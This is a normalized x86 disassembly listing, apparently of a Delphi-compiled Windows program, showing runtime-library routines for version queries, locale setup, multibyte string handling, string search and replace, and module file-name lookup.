push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40debc
movzx eax al
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40dafc
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
push ebp
call sub_40df54
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1e0
lea eax [ ebp - 0x10 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
mov ebx eax
sub_40e1f8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40e1e8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40df3c
mov eax [ rw-data ]
mov [ eax ] sub_40e120
mov eax sub_40de88
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40dea4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40e27c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
call sub_402f84
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_404650
xor eax eax
mov [ rw-data ] eax
retn
call sub_402fa4
push eax
call sub_402f84
pop edx
call sub_40e1e8
sub_40e314
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4057a0
sub_40e3a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40e47a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4055c8
lea eax [ ebp - 0x4 ]
call j_sub_4059f0#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e481
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax ebx
call sub_402f00
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40e45d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402f1c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_40e490
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
movzx eax [ eax ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
movzx ecx [ eax + esi ]
movzx ecx cl
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
movzx eax [ eax + edi ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40e504
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4059dc
mov edx esi
dec edx
call sub_40e490
sub_40e540
push ebx
mov ebx eax
mov ecx ebx
test ecx ecx
je r-xdata
cmp edx ecx
jle r-xdata
sub ecx 0x4
mov ecx [ ecx ]
call sub_40e564
pop ebx
retn
mov edx ebx
test edx edx
je r-xdata
sub edx 0x4
mov edx [ edx ]
sub_40e564
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
xor esi esi
test ebp ebp
jg r-xdata
mov eax edi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax ebp
setl al
sub eax 0x4
mov eax [ eax ]
test al al
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
xor esi esi
cmp ebp ebx
jl r-xdata
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40e7b0
mov ebx eax
jmp r-xdata
inc esi
cmp ebp ebx
jge r-xdata
sub_40e5cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
test eax eax
je r-xdata
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40e7b0
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40e7b0
dec eax
mov ebx eax
sub_40e65c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jg r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax ebx
setl al
sub eax 0x4
mov eax [ eax ]
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edi ebx
dec edi
mov edx edi
mov eax esi
call sub_40e5cc
cmp edi [ esp + 0x4 ]
jle r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax [ esp ]
setle al
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
inc [ esp ]
jmp r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
sub_40e6e0
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
xor eax eax
mov [ esp ] eax
test edx edx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
test eax eax
je r-xdata
cmp eax edx
jge r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
test eax eax
je r-xdata
mov [ esp ] edx
push esp
lea ecx [ esp + 0x8 ]
mov eax ebx
call sub_40e5cc
mov eax esi
test eax eax
je r-xdata
mov edx eax
sub eax 0x4
mov eax [ eax ]
cmp eax [ esp ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax esi
test eax eax
je r-xdata
mov [ esp ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
sub_40e778
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
movzx edx [ ebx + esi - 0x1 ]
movzx edx dl
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4059dc
add eax esi
dec eax
call sub_40e750
sub_40e7b0
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
movzx edx [ esi + ebx - 0x1 ]
movzx edx dl
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4059dc
add eax ebx
dec eax
call sub_40e750
add eax ebx
sub_40e7e8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
mov eax esi
test eax eax
je r-xdata
xor eax eax
cmp [ esi + ebx - 0x1 ] 0x5c
sete al
jmp r-xdata
cmp eax ebx
setge al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40e504
test al al
sete al
pop esi
pop ebx
retn
test al al
je r-xdata
test al al
je r-xdata
sub_40e830
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_405584
mov eax [ ebx ]
mov [ esp ] eax
mov esi [ esp ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov edx esi
call sub_40e7e8
test al al
jne r-xdata
sub esi 0x4
mov esi [ esi ]
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405818
sub_40e87c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_405584
mov eax [ ebx ]
mov [ esp ] eax
mov esi [ esp ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov edx esi
call sub_40e7e8
test al al
je r-xdata
sub esi 0x4
mov esi [ esi ]
pop edx
pop esi
pop ebx
retn
mov eax [ ebx ]
mov [ esp ] eax
mov eax [ esp ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax ebx
call sub_405c6c
sub eax 0x4
mov eax [ eax ]
sub_40e8cc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4059dc
push eax
mov eax esi
call sub_4059dc
mov ebp eax
mov eax ebp
pop edx
call sub_40e998
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40e904
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_409ae0
mov eax esi
test eax eax
je r-xdata
mov ebp eax
mov eax edi
mov edx ebp
call sub_405c6c
mov ebx 0x1
cmp ebp ebx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4059f0
movzx edx [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
movzx eax [ esi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
movzx eax [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4059f0
movzx edx [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4059f0
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40e998
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_40a868
mov [ esp ] eax
mov eax ebp
call sub_40a868
mov edi eax
mov edx ebp
mov eax esi
call sub_40aa54
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40e528
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_40aa54
mov ebx eax
inc ebx
sub_40ea38
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_40ea6c
mov esi eax
mov edi esi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi esi
inc esi
mov edx ebx
mov eax esi
call sub_40ea6c
mov esi eax
test esi esi
jne r-xdata
sub_40ea6c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_40aa40
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40e528
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_40aa40
mov edi eax
test edi edi
jne r-xdata
sub_40eaac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
push 0x0
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
movzx eax [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
movzx eax [ edi + esi + 0x6 ]
movzx ebx [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
movzx eax al
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40eb08
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi rw-data
mov [ esi ] 0x409
mov [ esi + 0x4 ] 0x9
mov [ esi + 0x8 ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ esi ] eax
push esi
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
pop esi
cmp [ rw-data ] 0x4
jle r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ esi + 0x4 ] edx
movzx eax ax
shr eax 0xa
mov [ esi + 0x8 ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ esi + 0xd ] al
cmp [ rw-data ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40eaac
pop ecx
mov [ esi + 0xd ] 0x1
jmp r-xdata
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ esi + 0xc ] bl
test bl bl
je r-xdata
sub_40ebcc
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40ee97
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40eb08
call sub_40d3e8
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40d334
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_405584
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_409f18
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_409f18
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40d380
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40d380
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_409f18
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40d380
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40d670
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_405584
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40d670
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_405584
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40d380
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40d334
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_405584
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40d334
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_405584
lea eax [ ebp - 0x8 ]
call sub_405530
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_409f18
test eax eax
jne r-xdata
call sub_40d5c0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4058e0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4058e0
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40d380
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee9e
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_405554
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_409f18
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40d334
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_409f18
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
sub_40ef44
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40f08d
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4055c8
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_4055c8
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_409aa8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_409aa8
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4055c8
mov eax esi
call sub_405530
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_40e8cc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f094
lea eax [ ebp - 0x1c ]
call sub_405530
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
push [ esi ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
mov eax esi
mov edx 0x3
call sub_4058e0
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_405818
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ edi + ebx ]
mov ecx 0x7fffffff
mov eax [ ebp - 0xc ]
call sub_405a44
test [ ebp + 0xc ] 0x1
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_405818
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x18 ]
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
sub_40f0bf
inc [ eax ]
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
adc al 0x24
push ebp
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
insb
jae r-xdata
mov eax [ esp ]
mov ebx [ eax + 0x14 ]
cmp [ ebx ] 0x0
je r-xdata
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp ] edx
call sub_405a44
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc eax
add ah dl
mov [ esp + 0x8 ] rw-data
mov [ esp + 0x8 ] rw-data
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_40e8cc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f094
lea eax [ ebp - 0x1c ]
call sub_405530
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
mov edx [ r-xdata ]
mov eax ebx
call sub_40641c
mov eax [ esp ]
xor edx edx
mov [ eax + 0x14 ] edx
inc ebp
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_406774
mov ebp eax
test ebp ebp
jl r-xdata
push [ esi ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
mov eax esi
mov edx 0x3
call sub_4058e0
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_405818
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 + 0x4 ]
mov [ edx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ edi + ebx ]
mov ecx 0x7fffffff
mov eax [ ebp - 0xc ]
call sub_405a44
test [ ebp + 0xc ] 0x1
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 ] 0x0
je r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ ebx + 0x4 ]
mov eax [ edx + eax * 8 + 0xc ]
call sub_40f0f4
mov ecx 0x3fd
xor edx edx
div ecx
mov [ esp + 0x4 ] edx
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebx + 0x4 ]
lea edx [ edx + edi * 8 ]
cmp eax edx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_405818
jmp r-xdata
inc esi
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 + 0x4 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ edx + ecx * 4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x18 ]
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
lea edi [ esi + esi * 2 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0x4 ] 0x0
je r-xdata
sub_40f0f4
push esi
push ebx
mov esi eax
xor eax eax
pop ebx
pop esi
retn
cmp bl 0x41
jl r-xdata
xor al bl
inc esi
jmp r-xdata
cmp bl 0x5a
jg r-xdata
rol eax 0x5
mov bl [ esi ]
cmp bl 0x0
je r-xdata
or bl 0x20
sub_40f234
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push ebx
call GetModuleFileNameA
mov ecx eax
mov edx esp
mov eax esi
call sub_405620
add esp 0x108
pop esi
pop ebx
retn
sub_40f278
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40f303
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40d2e8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f30a
lea eax [ ebp - 0x14 ]
call sub_405530
retn
sub_40f320
push ebx
push esi
mov bl 0x1
mov esi [ rw-data ]
jmp r-xdata
test bl bl
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
test esi esi
jne r-xdata
call [ esi + 0x4 ]
mov ebx eax
mov esi [ esi ]
sub_40f340
push ebx
push esi
mov esi rw-data
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ebx [ esi ]
mov eax [ ebx ]
mov [ esi ] eax
mov edx 0x8
mov eax ebx
call sub_402f1c
pop esi
pop ebx
retn
sub_40f3a4
push ebx
push esi
push edi
push ebp
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor edi edi
mov ebx [ rw-data ]
mov ebx [ ebx ]
test ebx ebx
je r-xdata
push 0xa
push r-xdata
mov eax [ rw-data ]
